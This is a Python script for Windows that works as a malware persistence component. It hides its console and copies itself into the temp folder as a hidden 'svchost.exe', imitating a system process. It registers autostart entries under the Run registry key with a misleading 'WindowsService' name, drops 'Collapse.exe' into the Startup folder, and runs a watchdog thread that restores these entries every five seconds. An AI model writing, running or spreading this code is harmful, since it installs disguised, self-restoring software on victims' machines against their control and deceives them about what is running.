import os
import shutil
import winreg as reg
import time
import ctypes
import sys
import tempfile
import threading

src = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Collapse.exe")
startup_folder = r"C:\Users\Home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Collapse.exe"
reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
hidden_path = os.path.join(tempfile.gettempdir(), "svchost.exe")
marker = os.path.join(tempfile.gettempdir(), "svchost.lock")

def hide_console():
    ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def copy_self():
    if not os.path.exists(hidden_path):
        shutil.copy2(sys.argv[0], hidden_path)
        ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)

def add_to_startup():
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "WindowsService", 0, reg.REG_SZ, hidden_path)
        reg.CloseKey(key)
    except:
        pass

def restore():
    if os.path.exists(src) and not os.path.exists(startup_folder):
        shutil.copy2(src, startup_folder)
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "Collapse", 0, reg.REG_SZ, startup_folder)
        reg.CloseKey(key)
    except:
        pass

def watch():
    while os.path.exists(marker):
        restore()
        time.sleep(5)

if __name__ == "__main__":
    hide_console()
    copy_self()
    add_to_startup()
    restore()
    with open(marker, 'w') as f:
        f.write('running')
    t = threading.Thread(target=watch, daemon=True)
    t.start()
    while True:
        time.sleep(60)